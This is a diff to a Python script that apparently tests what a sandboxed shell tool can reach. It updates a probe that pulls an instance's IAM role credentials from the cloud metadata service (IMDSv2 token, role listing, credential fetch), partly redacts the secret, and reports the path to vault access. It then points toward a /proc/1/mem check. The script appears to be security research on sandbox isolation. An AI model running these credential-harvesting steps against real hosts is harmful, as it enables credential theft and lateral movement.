@@ -140,35 +140,59 @@ def main():
     except Exception as e:
         print(f'  ERROR: {e}')
 
-    # --- 7. IMDS probe ---
+    # --- 7. IMDS probe (IMDSv2 — requires session token) ---
     section('7. IMDS (Instance Metadata Service)')
-    print('$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+    print('  # IMDSv2: PUT to get session token, then GET with token header')
+    print('  $ TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token')
+    print('      -H "X-aws-ec2-metadata-token-ttl-seconds: 60")')
     print()
-    role_name = run('curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/')
-    print(f'  Role: {role_name}')
-    if role_name and role_name != '(timeout)' and 'error' not in role_name.lower():
+    token = run('curl -s -X PUT --connect-timeout 2 http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60"')
+    if not token or 'timeout' in token or len(token) < 10:
+        # Try MMDS pattern (Firecracker microVMs use X-metadata-token)
+        token = run('curl -s -X PUT --connect-timeout 2 http://169.254.169.254/latest/api/token -H "X-metadata-token-ttl-seconds: 60"')
+    if token and len(token) > 10 and 'error' not in token.lower() and 'timeout' not in token:
+        print(f'  Token obtained: {token[:24]}... (len={len(token)})')
         print()
-        print(f'$ curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}')
-        creds_raw = run(f'curl -s --connect-timeout 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}')
-        # Parse and show structure without exposing full secret key
-        try:
-            import json as _json
-            creds = _json.loads(creds_raw)
-            print(f'  Type:            {creds.get("Type", "?")}')
-            print(f'  AccessKeyId:     {creds.get("AccessKeyId", "?")[:20]}...')
-            print(f'  SecretAccessKey:  {creds.get("SecretAccessKey", "?")[:8]}... (redacted)')
-            print(f'  Token:           {str(creds.get("Token", "?"))[:20]}... (len={len(str(creds.get("Token", "")))})')
-            print(f'  Expiration:      {creds.get("Expiration", "?")}')
-            print(f'  LastUpdated:     {creds.get("LastUpdated", "?")}')
-        except Exception:
-            # Show first 200 chars if not JSON
-            print(f'  {creds_raw[:200]}')
-        print()
-        print('  IMDS is reachable. The exec role credentials are obtainable')
-        print('  from the shell tool — same path notebook 13 uses for direct')
-        print('  vault access via boto3.')
+        hdr = f'X-aws-ec2-metadata-token: {token}'
+        role_name = run(f'curl -s --connect-timeout 2 -H "{hdr}" http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+        print(f'  $ curl -s -H "$TOKEN" .../iam/security-credentials/')
+        print(f'  Role: {role_name}')
+        if role_name and len(role_name.strip()) > 2 and '{' not in role_name:
+            role_name = role_name.strip()
+            print()
+            creds_raw = run(f'curl -s --connect-timeout 2 -H "{hdr}" http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}')
+            try:
+                import json as _json
+                creds = _json.loads(creds_raw)
+                print(f'  Type:            {creds.get("Type", "?")}')
+                print(f'  AccessKeyId:     {creds.get("AccessKeyId", "?")}')
+                print(f'  SecretAccessKey:  {creds.get("SecretAccessKey", "?")[:8]}... (redacted)')
+                print(f'  Token:           {str(creds.get("Token", "?"))[:32]}... (len={len(str(creds.get("Token", "")))})')
+                print(f'  Expiration:      {creds.get("Expiration", "?")}')
+                print(f'  LastUpdated:     {creds.get("LastUpdated", "?")}')
+            except Exception:
+                print(f'  {creds_raw[:300]}')
+            print()
+            print('  RESULT: IMDS reachable. Exec role credentials obtainable from')
+            print('  the shell tool — same path notebook 13 uses for direct vault')
+            print('  access via boto3 (GetWorkloadAccessToken + GetResourceApiKey).')
     else:
-        print('  IMDS not reachable or no role attached.')
+        # Fallback: check if boto3 can get creds (it uses its own IMDS path)
+        print(f'  Direct IMDS token: {token[:60] if token else "(empty)"}')
+        print()
+        print('  Trying boto3 credential chain instead:')
+        try:
+            import boto3 as _b3
+            sts = _b3.client('sts', region_name='us-east-1')
+            identity = sts.get_caller_identity()
+            print(f'  boto3 STS identity: {identity.get("Arn", "?")}')
+            print()
+            print('  RESULT: boto3 resolves credentials (likely via container')
+            print('  credential provider or ECS task role endpoint). The exec')
+            print('  role is reachable from the shell tool.')
+        except Exception as e:
+            print(f'  boto3 failed: {e}')
+            print('  IMDS/credential endpoint not reachable from shell tool.')
 
     # --- 8. /proc/1/mem access ---
     section('8. /proc/1/mem ACCESS CHECK (the primitive)')
